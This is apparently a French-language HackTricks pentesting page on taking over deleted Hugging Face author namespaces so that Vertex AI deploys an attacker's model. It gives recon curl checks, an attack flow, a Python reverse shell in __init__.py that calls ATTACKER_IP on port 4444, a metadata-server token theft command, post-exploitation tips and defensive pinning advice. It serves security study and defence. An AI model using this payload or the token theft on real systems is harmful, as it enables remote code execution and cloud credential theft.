# GCP - Vertex AI Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Scénario

- Vertex AI Model Garden permet le déploiement direct de nombreux modèles Hugging Face (HF).
- Les identifiants de modèles HF sont Author/ModelName. Si un author/org sur HF est supprimé, le même nom d'auteur peut être ré-enregistré par n'importe qui. Les attaquants peuvent alors créer un repo avec le même ModelName au chemin hérité.
- Des pipelines, SDKs, ou catalogues cloud qui récupèrent uniquement par nom (pas de pinning/intégrité) vont récupérer le repo contrôlé par l'attaquant. Quand le modèle est déployé, le code de loader de ce repo peut s'exécuter à l'intérieur du conteneur du endpoint Vertex AI, donnant une RCE avec les permissions de l'endpoint.

Deux cas courants de takeover sur HF :
- Suppression du propriétaire : l'ancien chemin renvoie 404 jusqu'à ce que quelqu'un ré-enregistre l'auteur et publie le même ModelName.
- Transfert de propriété : HF émet des redirections 307 de l'ancien Author/ModelName vers le nouvel author. Si l'ancien author est ensuite supprimé et ré-enregistré par un attaquant, la chaîne de redirection est rompue et le repo de l'attaquant répond au chemin hérité.

## Identification des namespaces réutilisables (HF)

- Ancien author supprimé : la page de l'author renvoie 404 ; le chemin du modèle peut renvoyer 404 jusqu'au takeover.
- Modèles transférés : l'ancien chemin du modèle émet 307 vers le nouveau propriétaire tant que l'ancien author existe. Si l'ancien author est ensuite supprimé et ré-enregistré, le chemin hérité résoudra vers le repo de l'attaquant.

Vérifications rapides avec curl:
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>
# 200 = exists, 404 = deleted/available

# Check old model path behavior
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 = redirect to new owner (transfer case)
# 404 = missing (deletion case) until someone re-registers
```
## Flux d'attaque de bout en bout contre Vertex AI

1) Découvrir des espaces de noms de modèles réutilisables que Model Garden indique comme déployables :
- Trouver des modèles HF dans Vertex AI Model Garden qui apparaissent encore comme “verified deployable”.
- Vérifier sur HF si l'Author original a été supprimé ou si le modèle a été transféré et que l'ancien Author a ensuite été supprimé.

2) Réenregistrer l'author supprimé sur HF et recréer le même ModelName.

3) Publier un repo malveillant. Inclure du code qui s'exécute au chargement du modèle. Exemples qui s'exécutent couramment lors du chargement d'un modèle HF :
- Effets de bord dans __init__.py du repo
- Fichiers modeling_*.py personnalisés ou code de processing référencé par config/auto_map
- Chemins de code nécessitant trust_remote_code=True dans les pipelines Transformers

4) Un déploiement Vertex AI du Author/ModelName hérité récupère maintenant le repo de l'attaquant. Le loader s'exécute à l'intérieur du container de l'endpoint Vertex AI.

5) Le payload établit un accès depuis l'environnement de l'endpoint (RCE) avec les permissions de l'endpoint.

Exemple de fragment de payload exécuté à l'import (à titre de démonstration uniquement):
```python
# Place in __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # Or python -c exec ...

if os.environ.get("VTX_AI","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Remarques
- Les loaders en conditions réelles varient. De nombreuses intégrations Vertex AI HF clonent et importent des modules de repo référencés par la config du modèle (par ex., auto_map), ce qui peut déclencher l'exécution de code. Certaines utilisations nécessitent trust_remote_code=True.
- L'endpoint s'exécute généralement dans un conteneur dédié avec un périmètre limité, mais il constitue un point d'appui initial valable pour l'accès aux données et les mouvements latéraux dans GCP.

## Conseils post-exploitation (Vertex AI Endpoint)

Une fois le code exécuté dans le conteneur de l'endpoint, envisagez :
- Énumérer les variables d'environnement et les métadonnées à la recherche d'identifiants/tokens
- Accéder au stockage attaché ou aux artefacts de modèle montés
- Interagir avec les API Google via l'identité du compte de service (Document AI, Storage, Pub/Sub, etc.)
- Persistance dans l'artefact du modèle si la plateforme retélécharge le repo

Énumérer les métadonnées de l'instance si accessibles (dépend du conteneur) :
```bash
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
## Conseils défensifs pour les utilisateurs de Vertex AI

- Épingler les modèles par commit dans les HF loaders pour empêcher le remplacement silencieux :
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Mettre en miroir les HF models vérifiés dans un dépôt/registry d'artefacts interne de confiance et déployer depuis celui-ci.
- Scanner en continu les codebases et configs à la recherche d'Author/ModelName codés en dur qui sont supprimés/transférés ; mettre à jour vers les nouveaux namespaces ou épingler par commit.
- Dans Model Garden, vérifier la provenance du modèle et l'existence de l'auteur avant le déploiement.

## Heuristiques de reconnaissance (HTTP)

- Auteur supprimé : page de l'auteur 404 ; chemin legacy du modèle 404 jusqu'à la prise de contrôle.
- Modèle transféré : chemin legacy 307 vers le nouvel auteur pendant que l'ancien auteur existe ; si l'ancien auteur est ensuite supprimé puis ré-enregistré, le chemin legacy sert du contenu malveillant de l'attaquant.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Références croisées

- Voir la méthodologie plus large et les notes sur la chaîne d'approvisionnement :

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Références

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
